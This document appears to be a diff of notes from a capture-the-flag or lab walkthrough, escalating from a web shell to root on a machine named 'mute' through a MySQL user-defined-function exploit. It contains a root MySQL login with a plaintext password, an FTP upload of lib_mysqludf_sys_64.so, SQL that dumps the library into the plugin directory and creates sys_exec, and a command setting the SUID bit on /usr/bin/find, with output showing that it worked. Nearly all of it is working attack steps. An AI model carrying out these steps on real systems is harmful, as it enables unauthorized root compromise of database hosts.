@@ -1,1 +1,54 @@
+www-data@mute:/tmp$ mysql -u root -p
+Enter password: peterRivierasick
 
+# location where mysql expects its udf to be stored.
+mysql> SHOW VARIABLES LIKE 'plugin_dir';
++---------------+------------------------+
+| Variable_name | Value                  |
++---------------+------------------------+
+| plugin_dir    | /usr/lib/mysql/plugin/ |
++---------------+------------------------+
+1 row in set (0.00 sec)
+
+# checking if database has been misconfigured to allow insecure handling of files.
+mysql> SHOW VARIABLES LIKE "secure_file_priv";
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+1 row in set (0.00 sec)
+
+https://github.sofianehamlaoui.fr/Security-Cheatsheets/databases/mysql/mysql-root-to-system-root/
+https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
+Using https://gist.github.com/p0c/8587757
+[OR] https://www.exploit-db.com/exploits/1518
+
+# using ftp to upload
+ftp> put lib_mysqludf_sys_64.so
+local: lib_mysqludf_sys_64.so remote: lib_mysqludf_sys_64.so
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+8040 bytes sent in 0.00 secs (207.2308 MB/s)
+
+ftp> chmod 777 lib_mysqludf_sys_64.so
+200 SITE CHMOD command ok.
+
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+[truncated]
+-rwxrwxrwx    1 1001     1001         8040 Aug 30 16:49 lib_mysqludf_sys_64.so
+226 Directory send OK.
+
+# connect to mysql
+use mysql;
+create table mute(line blob);
+insert into mute values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
+select * from mute into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
+create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
+select sys_exec('chmod +s /usr/bin/find');
+
+www-data@mute:/var/www/html$ ls -la /usr/bin/find
+-rwsr-sr-x 1 root root 221768 Feb 18  2017 /usr/bin/find
